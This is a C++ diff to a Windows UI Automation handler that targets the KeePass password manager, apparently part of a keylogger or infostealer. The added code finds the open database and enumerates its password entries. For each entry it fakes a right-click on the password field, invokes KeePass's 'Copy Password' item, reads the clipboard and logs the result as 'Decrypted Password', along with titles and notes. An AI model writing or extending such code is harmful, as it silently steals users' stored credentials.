@@ -51,60 +51,113 @@ void MyPropertyChangedEventHandler::HandleKeepass(IUIAutomationElement* pAutomat
 	//Log(L"HandleKeepass() in Property Invoked", DBG);
 
 	IUIAutomation* pAutomation = g_pMyTreeWalker->GetPAutomation();
-
-	CComPtr<IUIAutomationElementArray> pElementArray = NULL;
-	CComPtr<IUIAutomationCondition> pCondition = NULL;
-	CComPtr<IUIAutomationCondition> pTrueCondition = NULL;
-	CComPtr<IUIAutomationElement> pPassListEl = NULL;
-
-	HRESULT hr = ERROR_SUCCESS;
-
 	if (pAutomation == NULL)
 	{
 		Log(L"Can't get pAutomation from g_pMyTreeWalker in HandleKeepass()", DBG);
 		return;
 	}
 
-	hr = pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, _variant_t(L"m_lvEntries"), &pCondition);
-	if (FAILED(hr))
+	HRESULT hr = ERROR_SUCCESS;
+
+	BSTR bDbName = NULL;
+
+	CComPtr<IUIAutomationElement> pDbTreeElement = NULL;
+	CComPtr<IUIAutomationCondition> pDbTreeElementCondition = NULL;
+	CComPtr<IUIAutomationElement> pBranchDbTreeElement = NULL;
+	CComPtr<IUIAutomationCondition> pBranchDbTreeElementCondition = NULL;
+
+	hr = pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L"Database"), &pDbTreeElementCondition);
+	if (FAILED(hr) || pDbTreeElementCondition == NULL)
 	{
-		Log(L"Can't create property condition", DBG);
+		Log(L"Can't create database property condition", DBG);
 		return;
 	}
 
-	hr = pAutomation->CreateTrueCondition(&pTrueCondition);
-	if (FAILED(hr))
+	hr = pAutomation->CreatePropertyCondition(UIA_SelectionItemIsSelectedPropertyId, _variant_t(true), &pBranchDbTreeElementCondition);
+	if (FAILED(hr) || pBranchDbTreeElementCondition == NULL)
 	{
 		Log(L"Can't create true property condition", DBG);
 		return;
 	}
 
-	pPassListEl = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pCondition);
+	pDbTreeElement = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pDbTreeElementCondition);
+	if (pDbTreeElement == NULL)
+	{
+		Log(L"Can't find Database tree element", DBG);
+		return;
+	}
+
+	pDbTreeElement->FindFirst(TreeScope_Children, pBranchDbTreeElementCondition, &pBranchDbTreeElement);
+
+	if (pBranchDbTreeElement == NULL)
+	{
+		Log(L"Can't find selected db. May be we are in the root", DBG);
+		bDbName = SysAllocString(L"Database");
+	}
+	else {
+		hr = pBranchDbTreeElement->get_CurrentName(&bDbName);
+		if (FAILED(hr) || bDbName == NULL)
+		{
+			Log(L"Can't get db name", DBG);
+			return;
+		}
+	}
+
+	if (previousDb != NULL && wcscmp(previousDb, bDbName) == 0)
+	{
+		return;
+	}
+
+	SysFreeString(previousDb);
+
+	previousDb = SysAllocString(bDbName);
+		
+	CComPtr<IUIAutomationCondition> pPassListCondition = NULL;
+	CComPtr<IUIAutomationElement> pPassListEl = NULL;
+	CComPtr<IUIAutomationElementArray> pElementArrayWithoutHelpButtons = NULL;
+	CComPtr<IUIAutomationCondition> pConditionToElementArrayWithoutHelpButtons = NULL;
+	CComPtr<IUIAutomationCondition> pTrueCondition = NULL;
+
+	hr = pAutomation->CreateTrueCondition(&pTrueCondition);
+	if (FAILED(hr) || pTrueCondition == NULL)
+	{
+		Log(L"Can't create true condition", DBG);
+		return;
+	}
+
+	hr = pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, _variant_t(UIA_ListItemControlTypeId), &pConditionToElementArrayWithoutHelpButtons);
+	if (FAILED(hr) || pConditionToElementArrayWithoutHelpButtons == NULL)
+	{
+		Log(L"Can't create condition for password elements", DBG);
+		return;
+	}
+
+	hr = pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, _variant_t(L"m_lvEntries"), &pPassListCondition);
+	if (FAILED(hr) || pPassListCondition == NULL)
+	{
+		Log(L"Can't create m_lvEntries property condition", DBG);
+		return;
+	}
+
+	pPassListEl = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pPassListCondition);
 	if (pPassListEl == NULL)
 	{
 		Log(L"Can't find password list in keepass.exe", DBG);
 		return;
 	}
 
-	hr = pPassListEl->FindAll(TreeScope_Children, pTrueCondition, &pElementArray);
-	if (FAILED(hr))
+	hr = pPassListEl->FindAll(TreeScope_Children, pConditionToElementArrayWithoutHelpButtons, &pElementArrayWithoutHelpButtons);
+	if (FAILED(hr) || pElementArrayWithoutHelpButtons == NULL)
 	{
 		Log(L"Can't find passwords in the list", DBG);
 		return;
 	}
 
 	int count = 0;
-	pElementArray->get_Length(&count);
+	pElementArrayWithoutHelpButtons->get_Length(&count);
 
-	if (count == keePassPasswordsCount)
-	{
-		Log(L"No new passwords", DBG);
-		return;
-	}
-
-	keePassPasswordsCount = count;
-
-	Log(L"Found " + std::to_wstring(count-1) + L" stored passwords (one is the header and will be ignored)", INFO);
+	Log(L"Database: " + std::wstring(bDbName), INFO);
+	Log(L"Found " + std::to_wstring(count) + L" stored passwords", INFO);
 
 	for (int i = 0; i < count; i++)
 	{
@@ -115,7 +168,7 @@ void MyPropertyChangedEventHandler::HandleKeepass(IUIAutomationElement* pAutomat
 		VariantInit(&vValue);
 
 
-		hr = pElementArray->GetElement(i, &pEntryElement);
+		hr = pElementArrayWithoutHelpButtons->GetElement(i, &pEntryElement);
 		if (FAILED(hr))
 		{
 			Log(L"Can't get element from list in keepass.exe", DBG);
@@ -197,6 +250,73 @@ void MyPropertyChangedEventHandler::HandleKeepass(IUIAutomationElement* pAutomat
 			wsLogKeyStroke += L"\nNotes: " + std::wstring(bNotes);
 		}
 
+		// right-click simulation and copy password to clipboard
+		POINT originalCursorPos;
+		GetCursorPos(&originalCursorPos);
+
+		RECT rect;
+		hr = pEntryChildPasswordElement->get_CurrentBoundingRectangle(&rect);
+		if (SUCCEEDED(hr))
+		{
+			POINT pt = { (rect.left + rect.right) / 2, (rect.top + rect.bottom) / 2 };
+			SetCursorPos(pt.x, pt.y);
+			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
+
+			//Sleep(300);
+
+			CComPtr<IUIAutomationElement> pMainWindow = NULL;
+			CComPtr<IUIAutomationCondition> pMainWindowCondition = NULL;
+			CComPtr<IUIAutomationElement> pDropDownMenu = NULL;
+			CComPtr<IUIAutomationCondition> pDropDownMenuCondition = NULL;
+			CComPtr<IUIAutomationElement> pCopyPasswordButton = NULL;
+			CComPtr<IUIAutomationCondition> pCopyPasswordButtonCondition = NULL;
+
+			pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, _variant_t(L"MainForm"), &pMainWindowCondition);
+			pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L"DropDown"), &pDropDownMenuCondition);
+			pAutomation->CreatePropertyCondition(UIA_NamePropertyId, _variant_t(L"Copy Password"), &pCopyPasswordButtonCondition);
+
+			pMainWindow = g_pMyTreeWalker->FindFirstAscending(pEntryChildPasswordElement, pMainWindowCondition);
+			if (pMainWindow != NULL)
+			{
+				hr = pMainWindow->FindFirst(TreeScope_Children, pDropDownMenuCondition, &pDropDownMenu);
+				
+				if (SUCCEEDED(hr) && pDropDownMenu != NULL)
+				{
+
+					hr = pDropDownMenu->FindFirst(TreeScope_Children, pCopyPasswordButtonCondition, &pCopyPasswordButton);
+
+					if (SUCCEEDED(hr) && pCopyPasswordButton != NULL)
+					{
+						CComPtr<IUIAutomationInvokePattern> pInvokePattern;
+
+						hr = pCopyPasswordButton->GetCurrentPattern(UIA_InvokePatternId, (IUnknown**)&pInvokePattern);
+
+						if (SUCCEEDED(hr) && pInvokePattern != NULL)
+						{
+							//Log(L"Successfully find Copy Password field!", DBG);
+							pInvokePattern->Invoke();
+
+							std::wstring wsClipBoardData = L"";
+							hr = Helpers::GetClipBoardData(wsClipBoardData);
+							
+							if (SUCCEEDED(hr))
+							{
+								wsLogKeyStroke += L"\nDecrypted Password: " + wsClipBoardData;
+							}
+
+						}
+					}
+
+				}
+			}
+		}
+
+		SetCursorPos(originalCursorPos.x, originalCursorPos.y);
+
+		if (bDbName) {
+			SysFreeString(bDbName);
+		}
 
 		if (bTitleName) {
 			SysFreeString(bTitleName);
@@ -219,7 +339,7 @@ void MyPropertyChangedEventHandler::HandleKeepass(IUIAutomationElement* pAutomat
 		}
 
 		Log(wsLogKeyStroke, EMPTY);
-
+		
 		VariantClear(&vValue);
 	}
 }
